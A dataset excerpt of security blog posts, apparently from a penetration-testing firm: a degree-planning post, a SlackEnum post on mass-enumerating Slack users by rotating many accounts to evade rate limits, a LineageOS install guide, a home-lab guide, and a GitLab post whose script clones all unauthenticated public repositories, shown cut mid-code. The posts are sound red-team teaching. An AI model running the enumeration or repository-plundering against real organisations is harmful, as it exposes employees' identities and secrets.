the Cyber Ninja training program, you are going to be able to work through the courses quickly. WGU publishes the exact courses from Sophia learning that will transfer into their program, which is currently 44 of the required 122 credits. This means you already have over one-third of your degree credits complete. Do you think you could complete 2 classes per month considering there is no homework and you have already learned the majority of the material? If so, you would be done with your degree in one year at a total cost of $8,530.\n\nAnother exciting thing about WGU is that the course work and tuition covers many industry certifications. For the cyber degree, you complete the following 15 certifications (certification fees covered by WGU).\n\nB.S. Cybersecurity and Information Assurance\n\nITIL\u00ae*^ Foundation Certification\n\nCompTIA A+\n\nCompTIA Network+\n\nCompTIA Security+\n\nCompTIA Project+\n\nCompTIA CySA+\n\nCompTIA Network Vulnerability Assessment Professional\n\nCompTIA Network Security Professional\n\nCompTIA Security Analytics Professional\n\nCompTIA PenTest+\n\nCompTIA IT Operations Specialist\n\nCompTIA Secure Infrastructure Specialist\n\nLinux Essentials\n\nCertified Cloud Security Professional (CCSP)\n\nSystems Security Certified Practitioner (SSCP)\n\nAssume you take 6 months to complete the Cyber Ninja Training including TryHackMe ($90), 6-12 months with Sophia learning ($600), and one year at WGU ($8,530). This means you will be able to add a degree and 15 industry certifications to your resume in about 2 years for less than $10,000. Now that is a college hack!\n\nIf you have questions about anything here, reach out to Carrie (@OrOneEqualsOne) on the Atomic Red Team Slack or the Antisyphon or Black Hills Discord channels.\n\nIf you would like to learn more about Carrie and how she got into cybersecurity, check the links below:\n\nFailing a Pentest is not the End, It\u2019s a Beginning \u2014 My Beginning\n\nMy Journey: From Pentest to Red Team to Blue\n\nGot Enough Monitors?\n\nCarrie\u2019s Resume\n\nCarrie is currently a Red Teamer at Walmart. Comments and opinions are provided as personal opinion and not as a representative of Walmart. They do not reflect the views of Walmart and are not endorsed by Walmart.\n\nWant to hear more from Carrie herself? Join in on a free one-hour Antisyphon Anti-cast as she shares her recommended list of resources, as well as other low cost training options.\n\nRegister for this free mentoring session with Carrie here:\n\nGet an Epic Cyber Education for Free (Almost)! w/ Carrie Roberts\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Introducing SlackEnum: A User Enumeration Tool for Slack\"\nTaxonomies: \"How-To, Informational, Michael Allen, Recon, Red Team, Red Team Tools, Web App\"\nCreation Date: \"Thu, 27 Jun 2024 15:00:00 +0000\"\n\nRecently, as part of our ANTISOC Continuous Penetration Testing (CPT) service, I had an opportunity to investigate how attackers can leverage Slack in cyber-attacks, similar to how we frequently use Microsoft Teams to identify users and perform attacks during red team exercises (something Slack clearly makes an effort to prevent).\n\nTargeting Slack is particularly interesting because, even if an organization does not have a Slack subscription, individual users within the organization may have Slack accounts linked to their work email address. They may also use the Slack app or web interface on their work devices. In fact, after running the enumeration attack described in this article against our Continuous Penetration Testing customers, some were surprised to learn that hundreds of their employees had active Slack accounts connected to their work email addresses, even though the organization did not have a Slack subscription or use Slack in any official capacity.\n\nIn today's blog post, I'll share my process for developing SlackEnum - a new tool that can enumerate a large quantity of users and collect their names and email addresses for further action, while bypassing Slack's rate-limiting controls intended to prevent this abuse.\n\nNote: To keep from doxing any real Slack users, I've replaced unredacted email addresses in this article with fictitious email addresses on the domain, \"example.com\".\n\nSlack's User Enumeration \"Feature\"\n\nUser enumeration is based on a simple premise: If a site behaves differently when an invalid user ID is entered, versus when a valid user ID is entered, then it's possible to determine whether a given user ID is valid just by observing the website's response. In Slack's case, email addresses are that user ID \u2014 used to log into a user account, and used to identify other Slack users.\n\nAfter logging into Slack, a user can search for other users by clicking on the \"More\" button on the main screen and then clicking the \"External connections\" item in the menu.\n\nAt the top of the resulting page is a search box that allows searching for other users by their email address.\n\nIf you search for an email address that doesn't have a Slack account, Slack will tell you that the account doesn't exist.\n\nBut when you search for the email address of a valid Slack user, the user's email will be shown on screen along with a button that can be clicked to start a conversation with them. In some cases, the user's display name (usually their first and last name) is also displayed on screen.\n\nOn Slack, this method of user enumeration appears to be intended functionality rather than an unintended side effect. This is further evidenced by the fact that users and business subscribers have the option to prevent others from finding them with this method by disabling the \"Slack Connect discoverability\" setting on their account. In both cases, however, discoverability is enabled by default, and I have yet to encounter an organization that has disabled discoverability across their entire user base.\n\nEven though user enumeration on Slack seems to be intended, attackers don't care if user enumeration is the result of a bug or a feature. The benefit to attackers is the same either way. We can confirm that an email address exists, confirm that the owner has a Slack account, and sometimes get the full name of the account owner.\n\nSlack seems to be aware of this, since enumerating more than about 10 users from a free account results in rate limiting. When this happens, the account isn't allowed to lookup any other users until a cool-down period has passed.\n\nBypassing Rate Limits with a Gatling Gun\n\nDespite the rate-limiting, I still wanted to abuse this feature to enumerate Slack accounts, and I wanted to do it in bulk so I could use it for identifying Slack users organization-wide for all of our CPT customers.\n\nSince this user enumeration method was only possible while I was logged in, changing IP addresses alone would not get around the rate limit because it was my user account and not my IP address that had been rate limited.\n\nBut that gave me an idea:\n\nIf I spread the requests out over multiple Slack accounts, the request rate per account might be slow enough to keep from triggering the rate limit. This is similar to how the gatling gun could fire a barrage of bullets at a very high rate, but the barrel of the gun would not overheat because the bullets were fired from multiple, cycling barrels. After the first barrel fired, the other barrels continued firing, giving the first barrel time to cool down before another bullet was fired through it again. By spreading the workload across multiple barrels in this way, no barrel ever became hot enough to overheat.\n\nWith this concept in mind, I went to work automating the user enumeration process.\n\nPlanning for Automation\n\nUsing Burp Suite, I captured browser requests and server responses for each of the three scenarios I observed when interacting with the user search function through the web interface:\n\nFirst, there was the current search query, whose response indicated that my account was rate limited. Examining this request provided me with the path, \"/api/connectableContacts.lookup\", where my searches were being submitted; and the \"error\":\"ratelimited\" text in the response provided a clear indicator that rate limiting had been triggered.\n\nAfter the cool-down period had passed and my user account was no longer rate limited, I used Burp Repeater to replay the same request. I searched for the same email address, which did not have a matching Slack account. This let me capture the response for a non-existent account.\n\nThen I modified the email address in the request and issued it through Burp Repeater again. This time I searched for the email address of an account that I knew existed, which let me see both the server's response for a valid account and how the response data was formatted so I could extract the user's name when it was present.\n\nI repeated this process of modifying the email address and reissuing the request a few more times to confirm that the responses continued to match the same JSON data structure. Manually modifying and replaying the same requests several times also confirmed that no single-use tokens (e.g., CSRF tokens) were required to make a successful search request.\n\nThe last step in analyzing the search API was to determine whether any other parameters were required when performing a search. First, I removed all the cookies from my request and replayed it again, just to be sure unauthenticated search queries were not allowed. As expected, this request failed, and I received an \"invalid_auth\" error.\n\nI restored the cookies so that the request worked as normal again and then took a look at the POST parameters. The only POST parameter that looked like it might be unique to my user account was the \"token\" parameter, whose value started with \"xoxc-\".\n\nI modified the last few bytes of the token value and reissued the same request. Again, I got the same \"invalid_auth\" error as when I removed the cookies before, and this confirmed that a valid token value was required to make the search request.\n\nI used Burp Proxy to search for the token value in all previous requests and responses generated while I was using Slack in my web browser. The first mention of the token value was in a response from \"/ssb/redirect\", where the Slack API issued the token value to my browser alongside the key name \"api_token\".\n\nI replayed the request to \"/ssb/redirect\" a few times in Burp Repeater to confirm that the \"api_token\" value appeared in the response every time I made the request, which it did.\n\nAt this point, I was pretty sure I had everything I needed to make a basic user enumeration script for Slack. I just had to automate each individual step of the user enumeration process I just walked through, and then wrap the whole thing in cycle that would fire requests from multiple Slack accounts in sequence like the barrels of a gatling gun. That, and I needed a whole bunch of user accounts to act as those barrels.\n\nHow to Create 100 Slack Accounts\n\nBecause I could only make around 10 search requests in a short time before one user account got rate limited, I needed to create a lot more user accounts, so that the time between repeat requests from the same account would be as great as possible.\n\nSo, I created one hundred Slack user accounts, all joined to the same workspace.\n\nThis was by far the longest, most tedious part of this whole project. \ud83d\ude05\n\nIt reminded me of a time I hiked up the stairs from ground level to the 50th floor to break into the CEO's office during an on-site red team. The security guards in the building were taking the elevators as they made their rounds on each floor, because obviously no one was dumb enough to climb all the way to the top of a 50-story building up the stairs. Sometimes it's not anything technical or fancy that gets the win. Sometimes it's just doing something uncomfortable for longer than your opponent thinks any reasonable person would.\n\nTo be honest, I would have preferred climbing the stairs again to sitting here at my computer making 100 accounts. Fortunately, at least, Slack accounts can be created much faster than user accounts on a lot of other services, and I got it done in a couple hours.\n\nIf you want to use SlackEnum, you'll unfortunately have to pay a similar price, since multiple user accounts are required to get around the rate limit. So, here's the process I used to create a bunch of Slack accounts and join them to the same workspace in as few clicks and keypresses as possible:\n\nBuy a domain on NameCheap.com and set up email forwarding from that domain to your email address. This will let you receive all emails sent to any address on that domain.\n\nCreate a new Slack account and workspace with any made-up email on your domain.\n\nGenerate a list of however many email addresses you'd like to create accounts for. Here's an example of a command you can use to generate 99 email addresses on Linux (replace \"your-domain.com\" with your own domain, of course):\n\nfor n in {01..99} ; do echo user$n@your-domain.com ; done\n\n4. In your Slack account, click on \"Invite Coworkers\" and paste the list of all the email addresses you just generated.\n\nNow, in your email, you'll get a Slack invitation for every one of those email addresses.\n\nOpen one of the emails, click the invitation link, enter a name, and you'll be automatically logged in and joined to your Slack workspace.\n\nAfter getting logged in, export your browser's cookies to a file with the CookieBro browser extension. Then clear all the browser's cookies by pressing CTRL+Shift+Del and repeat.\n\nSlack Identities - The Barrels of the Gatling Gun\n\nTo handle multiple Slack accounts, I initially wrote a function to parse raw HTTP requests saved from Burp Suite. Since I had been using Burp to do all the initial testing, that seemed convenient at the time. But, like I mentioned in the last section, after I started creating and logging into multiple Slack accounts, I found that it was faster to just export the cookies with CookieBro. So, the result is that SlackEnum accepts Slack accounts in two different formats: either raw HTTP requests copied and saved from Burp or CookieBro-exported JSON files containing all the user's cookies.\n\nWithin SlackEnum, I refer to these attacker-controlled Slack accounts as \"Slack identities\" or \"Slack IDs\" to give them a clear name that's separate from the accounts that are targeted for enumeration.\n\nThe Slack IDs are saved to two, user-configurable folders - one for Burp requests and one for CookieBro files - and all the files from those folders are loaded and parsed by the script when it's launched. Since the CookieBro files only contain cookies, the Slack workspace hostname and browser user agent string are hardcoded into SlackEnum in the \"Settings\" section at the very top of \"slackenum.py\". Therefore, all Slack IDs imported from CookieBro files must be joined to the same Slack workspace, and that workspace hostname must be configured in the \"default_host\" setting at the top of the script.\n\nPutting it All Together\n\nAfter the first part of the script is executed to handle the Slack identities, the gatling gun cycle is kicked off to enumerate users.\n\nThe entire process executed by SlackEnum is roughly:\n\nLoad user-configured settings, hard-coded into the start of the script. These include the default Slack workspace hostname and default user agent string for the CookieBro Slack IDs as well as output file names, timing settings, and proxy settings so the script can optionally be proxied through other tools like Burp Suite.\n\nLoad the list of email addresses targeted for enumeration.\n\nLoad and parse Slack IDs from all the files in the two folders where they are stored. Slack IDs are then stored in a dictionary which tracks the workspace hostname, cookies, and user agent headers for each Slack ID. The status of rate limiting for each Slack ID and whether it is currently logged in are also tracked.\n\nFrom all the information loaded in the previous steps, generate some very rough estimates of how long the enumeration might take. In practice, these estimates sometimes end up being low, due to either increasing delays from some of the timing options, or from delays incurred by rate limiting if the timing options are set too low. I included these stats because they may help when adjusting the timing configuration in the settings at the top of the script or when deciding how many Slack IDs you need. (I recommend at least 100 Slack IDs to have a reasonably useful speed.)\n\nIf the user presses Enter to continue execution, SlackEnum runs the following steps in a loop, gatling-gun-style, until all of the target email addresses have been queried:\n\nA Slack ID is selected from the pool and checked to be sure it is still logged in and not rate limited.\n\nThe Slack ID's API token is requested from \"/ssb/redirect\".\n\nIf the token cannot be retrieved, the Slack ID is flagged as logged out and the cycle starts over with the next Slack ID in the list.\n\nA POST request is made to \"/api/connectableContacts.lookup\" to search for the next target email address in the list. \n\nIf the response indicates that the request was received successfully (\"ok\":true) but no such account exists (the \"contacts\" array is empty), the script creates a log file entry and prints an \"Invalid account\" message on screen.\n\nIf the response indicates that the request was received successfully (\"ok\":true) and the user exists (the \"contacts\" array contains user details), then the script logs the user's email address and name to the output file as a valid user account and prints a \"Slack account confirmed\" message on screen.\n\nIf the response contains a \"ratelimited\" error, the current Slack ID is added to the list of rate-limited Slack IDs where it waits until the cool-down period has passed. The same target email address will be tested with the next Slack ID in the list on the next cycle.\n\nIf anything else happens, the output is considered an unknown error. The cycle continues and the same target email address gets tested with the next Slack ID in the cycle.\n\nHere's the output of this phase of execution, continuing from where the last screenshot stopped. The \"00.txt\", \"01.json\", etc. filenames in brackets on the left side of the screen indicate the Slack ID file being used with each request.\n\nAnd here's the same output from the same scan as it appears in the CSV output file.\n\nSanity Check\n\nFinally, since I didn't want to risk launching a long-running enumeration scan with any Slack IDs that were logged out or had other problems, I added a \"--sanity\" flag. This flag allows the user to provide a single email address, which is known to be valid, and then to enumerate the same account with every available Slack ID. This way, any Slack IDs that are generating errors or false negatives can be quickly identified before starting a long running job.\n\nConclusion\n\nWell, that's it. I hope you enjoyed this article. \ud83d\ude42\n\nIf you'd like to try out SlackEnum yourself, you can download it on GitHub here: https://github.com/Wh1t3Rh1n0/SlackEnum\n\nAnd if you liked this content, you might want to check out my class, Red Team Initial Access, where I teach all the go-to techniques we use to break into modern, enterprise environments over the Internet today.\n\nWant more content from Michael? Why not take a class with him?\n\nView his upcoming course schedule here:\n\nRed Team Initial Access\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"How to Install LineageOS on Your Android Device\"\nTaxonomies: \"Connor Costigan, Hardware Hacking, Informational, Mobile, Android, LineageOS, ROM Flashing\"\nCreation Date: \"Thu, 11 Jul 2024 15:05:22 +0000\"\n\nHey guys, my name is Connor. I am a web developer here at BHIS who also loves hacking phones. Particularly, Android phones! Today, I am going to show you the basics on installing LineageOS onto your Android device while providing extra detail and background on the installation process as a whole. Although this tutorial is aimed at installing LineageOS specifically, the lessons taught here can be applied to installing other ROMs for your device. \n\nWhat is Lineage? Why Lineage? \n\nTo understand Lineage, it would be good to first go over a little bit of history regarding Android. Android\u2019s Operating System is an open-source Linux operating system that is maintained by Google. This does not mean that someone can access the OS code for flagship phones such as the Samsung Galaxy, Google Pixel, OnePlus, etc. as they have added closed source code on top of the open-source base Android OS code. This baseline Android OS is exactly what LineageOS takes advantage of. It is a distribution of the open-source baseline Android code that is distributed for a massive number of smartphones. These distributions allow older phones to upgrade to newer Android OS versions without getting a factory update, extending the life of these phones greatly. This open-source version of Android also allows users to root their phones, giving them extra permissions as well as the removal of the Google API from the OS entirely (which is impossible with the built-in OS of most smartphones).  \n\nA WORD OF CAUTION BEFORE CONTINUING \n\nBefore continuing, it is worth noting that installing a new OS onto any Android device is risky. Data will be formatted during the installation process, which means you should make sure to BACK UP ALL IMPORTANT FILES before continuing! There is also the risk of \u201cbricking\u201d your smartphone. This is when the bootloader is no longer functional and cannot load either LineageOS or the original operating system, leaving the phone in an unusable state. During the installation, the option to not install GApps (Google apps, such as play store, Google Maps, Gmail, etc) will be available If you choose to not install GApps, just know that there will be apps that will not work properly and many that may not run entirely. Due to these potential dangers listed above, it is best to install LineageOS on a smartphone that is sitting on your shelf or in your drawer, and not the current phone you have in use. If you do wish to install LineageOS on your most current smartphone, proceed with caution!  \n\nWhat you need to get started \n\nAn Android smartphone (preferably an older phone that is supported by LineageOS (see the supported devices here) with developer mode enabled. \n\nA computer/laptop with Android ADB platform tools installed to an accessible directory (should include fastboot as well). We will go over downloading this in the tutorial, so do not worry if you do not have these yet. \n\nA wire capable of connecting and transferring data between your Android phone and computer. This usually can be a charging wire that is USB to Micro USB. \n\nA copy of the LineageOS ROM file for your specific device (we will go over getting this in the tutorial) \n\nA recovery ROM for fastboot. LineageOS offers their own recovery software that we will use, but TWRP is a common recovery ROM that people use as well. If you are already comfortable with TWRP, then feel free to use it! \n\n.APK files for installing any specific apps that require pre-boot installation (see recommendations below). These are not required to install the OS, but often are wanted by users and must be installed into the system before the first bootup of the OS. \n\nA can-do attitude! \n\nRecommended (but optional) packages to install: \n\nMagisk \u2013 A systemless root app, that makes granting and revoking super user privileges to apps easy. \n\nMindTheGaaps \u2013 a package that contains Google apps such as play store, Gmail, Google Maps, etc. This is good for people who want the Google apps included with the open-source nature of LineageOS (Note: if your goal is to create a \u201cghost phone,\u201d do not use Google services). \n\nFdroid \u2013 It is an alternative app store that carries a decent library of good apps, games, utilities, etc. \n\nGetting everything ready to go \n\nAssuming you have your Android device ready to go, let\u2019s get the computer or laptop set up for this job. First and foremost, we are going to install Android platform tools. These tools include both the Android Development Bus (adb) and fastboot tools. LineageOS has a really good guide on installing the necessary tools. You can also download the development tools directly from the Android site. \n\nOnce we have Android platform tools installed, we need to see if adb works. To get adb to work with your Android device, the device must be running with developer mode enabled. To do this, go into the \u201cabout\u201d section of your phone settings. Once there, find the build number and tap on it around 10 times until developer mode is activated. If you cannot find the build number, I recommend you Google how to enable developer mode for your phone. Now that you can access the developer options, make sure to enable USB Debugging, and OEM Unlocking can be enabled if your system supports it. \n\n Once this is ready to go, plug your Android device into the computer. There should be a dialog on your Android device that asks if you should enable USB debugging. Make sure to allow it (you can also say \u201calways allow\u201d so you don\u2019t have to allow it every time). Once it is allowed, entering the command \u201cadb devices\u201d in your command prompt/terminal should show your Android device. \n\nNow that we have adb installed and set up, we will need the ROM files necessary for LineageOS installation. Head to the devices page of the LineageOS site and find your device. Once you see your model, click on it to view useful info such as the special boot modes and how to access them, as well as quirks that are known for your device. Click the \u201cGet the Builds Here\u201d link in the downloads section to get the 2-3 files you need for installation (should be a .zip file as well as a .img file).  \n\nClick the installation link to see the step-by-step for your device. I am going to be going over the general steps, but I recommend going through the specific installation guide for your device from LineageOS, alongside this guide (you can access it from the devices page on the LineageOS website). Given that guide is specific for every device, those instructions will be more important than the general guide of this article. \n\nA note on LineageOS official ROM files vs unofficial ROM files: You may notice that LineageOS supports a good number of older devices on their website. Due to the open-source nature of LineageOS, there are places you can go (often XDA forums) that will have links to ROM files that are LineageOS-built to run on an unofficial device. These ROM files often work well enough to get the phone running, with some of the devices garnering a massive number of developers and support. You can, if you wish, use these unofficial ROMs, but you should be cautious, as there is little support for these unofficial builds and unofficial sources could be malicious, so caution is advised. I only recommend using unofficial builds of LineageOS if you know what you are doing and have installed LineageOS before. \n\nFree the bootloader \n\nThe first step you need to make on your Android device is unlocking the bootloader. This will vary greatly across each device, and I recommend you follow the instructions on your LineageOS installation guide for your specific device. Be warned: unlocking the bootloader will reset your phone, meaning you will lose all data and apps. Make sure everything is backed up before continuing! If your guide does not include instructions on how to unlock the bootloader or a link to a guide, a quick Google search should point you in the right direction. Once the bootloader is unlocked, you can proceed to the next step. \n\nQuick note on adb, fastboot, and the bootloader: Adb is often run when the Android device is booted up and running (the phone is running as normal and not in the bootloader). Fastboot commands run when the device is rebooted into the bootloader. When the device is operational, running \u201cfastboot devices\u201d will return nothing, but typing \u201cadb devices\u201d will show your phone (assuming USB debugging was enabled). Vice versa when you are in the bootloader, so there is no need for alarm when adb does not return anything in the bootloader.  \n\nWhen the bootloader is present, you will not see any devices using the adb command.  \n\nAdb will only be accessible during the bootloader process when it is specifically enabled in recovery, but is not needed during the bulk of the bootloader process. The bootloader itself can be thought of as the BIOS of a phone. It is what will load the OS after boot. The reason it must be unlocked is to allow us to make changes to what the bootloader loads upon boot. \n\nA little more in-depth with the bootloader, unlocking, and the boot up process of Android devices in general \n\nThe LineageOS wiki will guide you through the process of getting the bootloader unlocked and ready to install the OS, but let\u2019s take a moment before we begin that process to really understand what we are doing under the hood. If you want to continue with the installation process, feel free to jump to the next section. \n\nWhen the Android device starts up, the low-level code instantiates the memory of the system. Once the memory is set, the code can begin checking the partitions and boot images. If something is off or improperly loaded, recovery will be booted up. If everything passes ok, the boot image begins loading and instantiating. After everything is properly loaded and run, the OS starts up and the user can begin interacting with the phone. \n\nWhat we are doing when installing LineageOS is replacing the boot images that come from the phone vendor with Lineage\u2019s own boot image. To install this, we must be in the bootloader level. Unlocking the bootloader will give the bootloader permission to install/modify system images and various files. The recovery image that was downloaded alongside the LineageOS image will allow us to install the OS image through the recovery process, as well as other various APK files (we will discuss this more in detail later).  \n\nThis is where the fun begins\u2026 accessing recovery \n\nNow that our bootloader is cleared, we are good to flash the recovery image to the bootloader and truly begin the installation process. There are multiple ways you can access the bootloader, but the two most straightforward ways are through the physical buttons on your phone, and the adb command. Every phone is different in configuration but restarting the phone and holding \u201cvolume down and power\u201d together, or some similar combination of buttons, should give you access to the bootloader menu (feel free to Google the exact combination for your device or check the LineageOS instructions for your device). If you have your phone still connected to the PC with a terminal open, another option is entering the command \u201cadb -d reboot bootloader\u201d in your terminal.  \n\nYour Bootloader look may vary, but it should be similar looking to this \n\nYou should see the device turn off for a brief moment and restart in the bootloader. For some devices, you may get a warning about the bootloader being unlocked, but you can ignore this message, as that is exactly what we need for installation.  \n\nOnce the menu is active, try entering and executing the command, \u201cfastboot devices\u201d. You should see your device ID there. If it is there, the next step is to flash the recovery image. When you \u201cflash\u201d an image to the bootloader, you are booting something up that is different than the traditional vendor image. This means instead of booting into the normal OS that is run by the vendor, we will boot into the LineageOS recovery image. Look at your installation guide for your specific device for the exact command, but it should be close to the command \u201cfastboot flash boot [NameOfYourBoot].img\u201d or \u201cfastboot flash recovery recovery.img\u201d. Running this command should boot up the recovery.  \n\nNow that recovery is running, we can install Lineage. \n\nInstalling LineageOS (And other apps) \n\nNow that we have recovery booted up and running, we can begin installing the actual zip package containing the OS. \n\nNOTE: Please read through this section ENTIRELY before executing any commands, as there are steps that must be performed in order to successfully install. This is the POINT OF NO RETURN. Once you start loading the files of LineageOS, there is no going back! \n\nTap the section of recovery that says, \u201cfactory reset\u201d. Choose the option within that menu that states \u201cFormat data/ factory reset\u201d. This will remove all data in the system, as well as system files.  \n\nOnce this finishes, you can return to the menu and begin sideloading the OS zip file. Sideloading is a term used by Android developers and modders that allows packages such as zip files and APKs to be installed through the adb, rather than the Google Play store or other software store. Select \u201cApply Update\u201d and then the \u201cApply from ADB\u201d from the menu. This enables the adb temporarily, which will allow us to run the sideload commands. Make sure to check the exact command in your specific device guide on the LineageOS website, but the command should look similar to \u201cadb -d sideload [filename of LineageOS package].zip\u201d.  \n\nOnce the install is complete, it may ask you to reboot, but do not reboot if you are planning on installing certain root software such as Magisk or low-level apps such as Google Apps or mind the GAPPS. These apps require installation in this recovery BEFORE the new OS boots up and initializes. You can install all these apps in a similar way by sideloading them through the adb. Tap the \u201cApply Update\u201d and \u201cApply from ADB\u201d option that you selected before to turn the adb capabilities back on. From there, you can simply install each desired apk package by typing in \u201cadb -d sideload [package].apk\u201d.\u201d \n\nOnce you have installed the packages you like, tap the \u201creboot system now\u201d option and enjoy your new OS! \n\nStuck? Need some extra help?\n\nFeel free to reach out to the tool-sharing channel of our Discord! \n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Build a Home Lab: Equipment, Tools, and Tips\"\nTaxonomies: \"General InfoSec Tips & Tricks, Guest Author, How-To, Informational, InfoSec 101, home lab, InfoSec Survival Guide, virtual machines\"\nCreation Date: \"Thu, 25 Jul 2024 15:00:00 +0000\"\nby Martin Pearson || Guest Author\n\nThis article was originally published in the second edition of the InfoSec Survival Guide. Find it free online HERE or order your $1 physical copy on the Spearphish General Store. \n\nA home lab will not only enhance your learning opportunities, but can also give you a safe place to play by using virtual machine to emulate a computer, giving you the ability to easily make mistakes with no fear of harm to your personal setup. \n\nPracticing on entry-level product is a great way to get started. Think about what you want to learn and how your setup will help you meet your goals. You don't need the fastest equipment, the most storage, or the best memory to start your home lab. Even if you can afford the best, it won't suddenly make you a master hacker. It relies on your commitment, not your equipment. \n\nIn general, the fundamental building blocks of a lab are a network, virtual machines, and the physical machine to run them on. It's common to have one Linux (Kali) machine and usually one Windows client/server. This will be enough to do some really fun stuff!\n\nVM Options\n\nThere are lots of virtualization software to choose from. Below are some links to get you started. (Don't worry if these mean nothing to you at this stage; it's just good to be aware.)\n\nproxmox.com/en/\n\nvmware.com/products/workstation-pro.html\n\ndocs.vmware.com/en/VMware-vSphere/7.0/com.vmware.esxi.install.doc/\n\nqemu.org/download/\n\nvirtualbox.org/\n\nEquipment Considerations\n\nHow many virtual machines do you want (vs. how many you actually need)?\u00bb How many might you want in the future?\u00bb The more virtual machines, the more memory/storage space you will need.\u00bb Consider purchasing second-hand machines fi rst.\n\nIt is better to have a separate network to avoid family/user arguments whenyou play \u2013\u00bb Consider a dedicated router or switch.\n\nYou WILL break things! Make a backup (sometimes called a snapshot).\n\nOther Considerations\n\nBoth Windows client and server can be used in evaluation-mode legally (noneed to purchase).\n\nKali and Parrot are commonly used operating systems that will give you all thelearning tools you need. Search Kali or Parrot ISO to fi nd out more.\u00bb To learn about the operating systems and their included tools:\n\nhttps://www.kali.org/tools/\n\nhttps://www.parrotsec.org/\n\nA journey of a thousand miles begins with a single step!\n\nConsider exactly what you\u2019re trying to achieve. You don\u2019t need to know anddo everything right away.\n\nDepending on what you start off with and how your needs grow, you may decide to buy more machines. Remember, they are very easy to network, so no need to throw away your old equipment. Above all, have fun and learn!\n\nReady to learn more? \n\nCheck out this BHIS webcast on the topic here -- \n\nHow To Build a Home Lab for Infosecwith Ralph May\n\n"
    },
    {
        "input": "",
        "instruction": "",
        "output": "Title: \"Auditing GitLab: Public Gitlab Projects on Internal Networks\"\nTaxonomies: \"External/Internal, General InfoSec Tips & Tricks, How-To, InfoSec 201, audit, GitLab, gitleaks, leaks, secrets\"\nCreation Date: \"Thu, 18 Jul 2024 15:00:00 +0000\"\n\nA great place that can sometimes be overlooked on an internal penetration test are the secrets hidden in plain sight. That is, a place where no authentication is required in many circumstances throughout internal networks. I'm talking about source code management platforms, specifically Gitlab. Other self-hosted platforms are likely also susceptible to this unauthenticated technique as well, but we'll be focusing on GitLab. \n\nA sequence of words that I've heard: \n\nMr. Senior Developer - \"If an attacker already has access to our internal network, we've got bigger problems.\"\n\nThe biggest problem is this kind of thinking! Yes, a hacker inside your internal network is a problem that requires immediate attention, but the defensive measures you implement as an organization leading up to this kind of event are what really counts. It is a common misconception that once an adversary has gained initial access to an organization's network, that it is already game over. Verily, I tell you, good neighbor, that this is not the case! There are many things that you can do to defend against attackers inside the internal network. For instance, security landmines at every turn via canary tokens and other awesome things. But in this blog post, we'll be talking about attacking and defending (but mostly attacking) self-hosted GitLab instances.  \n\nI've come across internal GitLab instances in organizations' internal networks countless times and many of them have one thing in common, many of their projects are set to \"public.\" One might think or blurt out, \"Well, first you would need a valid account to log in to GitLab to access these projects,\" and to that I say, with great vigor, \"False!\" \n\nIn GitLab, when a project scope is set to \"public,\" it is still accessible to anyone with network access. Better yet, it is discoverable via the GitLab projects API at the URL, https:///api/v4/projects.  \n\nSpoiler alert: The process of finding all public GitLab projects and downloading everything can be quickly automated with no authentication. On an amusing side-note anecdote, Nessus won't tell you this, but your organization's crown jewels are totally exposed! That's because this is a feature, not a bug. But that's not to say that Nessus isn't totally barren of fruits altogether. Nessus will still identify all the GitLab instances for you, that is, if you're using Nessus. Whether you're using Nessus or not, we can still easily identify all the GitLab instances on an internal network using Nuclei, more specifically, a Nuclei GitLab workflow: \n\nnuclei -l in-scope-cidrs-ips-hosts-urls-whatever.txt \\ \n\n-w ~/nuclei-templates/workflows/gitlab-workflow.yaml \\ \n\n-o gitlab-nuclei-workflow.log | tee gitlab-nuclei-workflow-color.log \n\nThe screenshot below shows a portion of the output from the command above. \n\nNuclei GitLab Workflow Partial Output (Redacted) \n\nThere are many code-secret scanning tools such as Trufflehog, Gitleaks, NoseyParker, and others. We'll be utilizing Gitleaks for this blog post, but, as an exercise, I encourage you to use all three and compare your results. One downside of many of these tools at the time of writing is the reliance on authentication for mass automated scanning, but this can be done from an unauthenticated context too (when the GitLab public repos api is accessible). If you have come across GitLab instances on internal penetration tests but weren't sure how to automate and achieve that sweet juicy pwnage, then this blog is for you. \n\nAs Pastor Manul Laphroaig would say, PoC || GTFO! \n\nPlundering GitLab \n\nForgive me, neighbors, if this feature already exists in any given open-source tool but indulge me in the discussion of automating this from scratch. We'll be using a ragtag team of Python and Go. \n\nClone All the Things \n\nThis should ideally be included as a feature to some of these tools \u2014 or perhaps it already is \u2014 nonetheless, here's a Python script to download every public repository to their appropriately named directory hierarchy: \n\n#!/usr/bin/env python3\n\nimport requests\nimport json\nimport subprocess\nimport os\n\nPWD = os.getcwd()\n\ndef get_repos_with_auth(projects_url, base_url, token):\n headers = {'Private-Token': token}\n repos = {}\n page = 1\n\n while True:\n response = requests.get(projects_url, headers=headers, verify=False, params={'per_page': 100, 'page': page})\n data = json.loads(response.text)\n if not data:\n break\n for repo in data:\n print(f\"Repo {repo['http_url_to_repo']}\")\n path = repo['path_with_namespace']\n repos[path] = f\"{base_url}{path}.git\"\n page += 1\n\n return repos\n\ndef get_repos(projects_url, base_url):\n repos = {}\n page = 1\n\n while True:\n response = requests.get(projects_url, verify=False, params={'per_page': 100, 'page': page})\n data = json.loads(response.text)\n if not data:\n break\n for repo in data:\n print(f\"Repo {repo['http_url_to_repo']}\")\n path = repo['path_with_namespace']\n repos[path] = f\"{base_url}{path}.git\"\n page += 1\n\n return repos\n\ndef run_command(command):\n try:\n subprocess.call(command, shell=True)\n except:\n print(\"Error executing command\")\n\ndef clone_repos(repos: dict):\n for path, repo in repos.items():\n dirs = path.split(\"/\")\n\n directory = \"/\".join(dirs[:-1])\n if not os.path.exists(directory):\n os.makedirs(directory)\n\n if os.path.exists(f\"{PWD}/{directory}/{os.path.basename(repo).rstrip('.git')}\"):\n continue\n\n os.chdir(directory)\n clone_cmd = f\"git clone {repo}\"\n print(clone_cmd)\n run_command(clone_cmd)\n os.chdir(PWD)\n\ndef main():\n # token = \"CHANGETHIS\" # CHANGETHIS if using auth_base_url\n # user_id = \"CHANGETHIS\" # CHANGETHIS if using auth_base_url\n projects_url = \"https:///api/v4/projects\" # CHANGETHIS\n # auth_base_url = f\"https://{user_id}:{token}@/\" # CHANGETHIS.\n unauth_base_url = f\"https:///\" # CHANGETHIS.\n # repos = get_repos_with_auth(projects_url, auth_base_url, token)\n repos = get_repos(projects_url, unauth_base_url)\n print(f\"Total Repos: {len(repos)}\")\n clone_repos(repos)\n\nif __name__ == 